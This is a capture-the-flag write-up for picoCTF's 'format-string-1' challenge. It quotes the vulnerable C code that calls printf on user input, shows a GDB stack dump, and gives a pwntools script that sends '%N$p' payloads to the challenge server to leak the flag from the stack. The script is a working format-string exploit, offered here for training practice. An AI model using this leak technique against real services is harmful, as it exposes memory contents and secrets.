### Challenge Description
---
Patrick and Sponge Bob were really happy with those orders you made for them, but now they're curious about the secret menu. Find it, and along the way, maybe you'll find something else of interest!


Open source file and easily find out a format string bug here at ``` printf(buf) ```

```
  printf("Give me your order and I'll read it back to you:\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your order: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  printf("Bye!\n");
  fflush(stdout);
```

Above, there is a chunk of code that open file flag.txt and store the content in the buf variable.

```
  // Read in first secret menu item
  FILE *fd = fopen("secret-menu-item-1.txt", "r");
  if (fd == NULL){
    printf("'secret-menu-item-1.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(secret1, 64, fd);
  // Read in the flag
  fd = fopen("flag.txt", "r");
  if (fd == NULL){
    printf("'flag.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(flag, 64, fd);
  // Read in second secret menu item
  fd = fopen("secret-menu-item-2.txt", "r");
  if (fd == NULL){
    printf("'secret-menu-item-2.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(secret2, 64, fd);
```
So, to exploit format string bug, we have to find out exactly where flag is placed on the stack using GDB and leak it. Remember to create 3 txt files named secret-menu-item-1.txt, secret-menu-item-2.txt, flag.txt in contemporary folder to test it locally.

```
gef➤  tel
0x00007fffffffd810│+0x0000: "comtamsuonbicha\n"  ← $rsp
0x00007fffffffd818│+0x0008: "onbicha\n"
0x00007fffffffd820│+0x0010: 0x0000000000000000
0x00007fffffffd828│+0x0018: 0x00007ffff7ffdab0  →  0x00007ffff7fcb000  →  0x03010102464c457f
0x00007fffffffd830│+0x0020: 0x00007fff00000000
0x00007fffffffd838│+0x0028: 0x00007fffffffd888  →  0x00000000ffffffff
0x00007fffffffd840│+0x0030: 0x0000000000000000
0x00007fffffffd848│+0x0038: 0x00007fffffffd890  →  "bolalotchanem\n"
0x00007fffffffd850│+0x0040: "picoCTF{fake_flag}\n"
0x00007fffffffd858│+0x0048: "fake_flag}\n"
```
We see that the flag is put on 0x00007fffffffd850, which is 14th argument according to calling convetion. However, it's not single 8 bytes so it ought to reach to several adjacent address from there.
Therefore, we'll write an brute-force exploit:

```
#!/usr/bin/python3

from pwn import *

exe = ELF('./format-string-1', checksec=False)
flag = b''
for i in range(14, 19):
	# r = process(exe.path)
	r = remote('mimas.picoctf.net', 53932)

	r.sendlineafter(b'to you:\n', f'%{i}$p'.encode())


	r.recvuntil(b"Here's your order: ")
	recv = r.recvall().strip()

	part = p64(int(recv.split(b'\n')[0], 16))
	if b'}' in part:
		flag += part
		print(flag, end='')	
		exit()
	else:
		flag += part
r.interactive()
```
